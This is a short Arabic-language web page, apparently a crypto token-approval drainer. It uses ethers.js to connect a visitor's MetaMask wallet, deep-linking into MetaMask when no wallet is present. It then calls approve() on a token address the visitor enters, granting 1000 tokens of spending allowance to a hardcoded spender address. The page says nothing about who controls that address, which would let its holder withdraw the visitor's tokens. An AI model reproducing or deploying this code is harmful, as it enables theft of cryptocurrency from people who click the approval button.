<!DOCTYPE html>
<html lang="ar">
  <head>
    <meta charset="UTF-8" />
    <title>الموافقة على السحب</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
    <style>
      body {
        font-family: Arial, sans-serif;
        text-align: center;
        padding: 20px;
      }
      input, button {
        padding: 10px;
        font-size: 18px;
        margin-top: 10px;
        width: 90%;
      }
    </style>
  </head>
  <body>
    <h2>الموافقة على سحب 1000 توكن</h2>
    <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن ERC20" />
    <button id="approveBtn">اعمل Approve 1000</button>
    <p id="result"></p>

    <script>
      const approveBtn = document.getElementById("approveBtn");
      const result = document.getElementById("result");

      approveBtn.addEventListener("click", async () => {
        const tokenAddress = document.getElementById("tokenAddress").value.trim();
        const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // عنوان محفظتك

        if (!window.ethereum) {
          // توجيه تلقائي لفتح MetaMask
          const dappUrl = encodeURIComponent(window.location.href);
          const metamaskDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
          window.location.href = metamaskDeepLink;
          return;
        }

        try {
          const provider = new ethers.BrowserProvider(window.ethereum);
          let accounts = await provider.send("eth_requestAccounts", []);
          const signer = await provider.getSigner();
          const contract = new ethers.Contract(tokenAddress, [
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function decimals() view returns (uint8)"
          ], signer);

          const decimals = await contract.decimals();
          const amount = ethers.parseUnits("1000", decimals);

          const tx = await contract.approve(spenderAddress, amount);
          result.textContent = "جاري انتظار تأكيد المعاملة...";
          await tx.wait();
          result.textContent = "✅ تمت الموافقة بنجاح!";
        } catch (err) {
          console.error(err);
          result.textContent = "❌ حدث خطأ: " + (err.shortMessage || err.message);
        }
      });
    </script>
  </body>
</html>
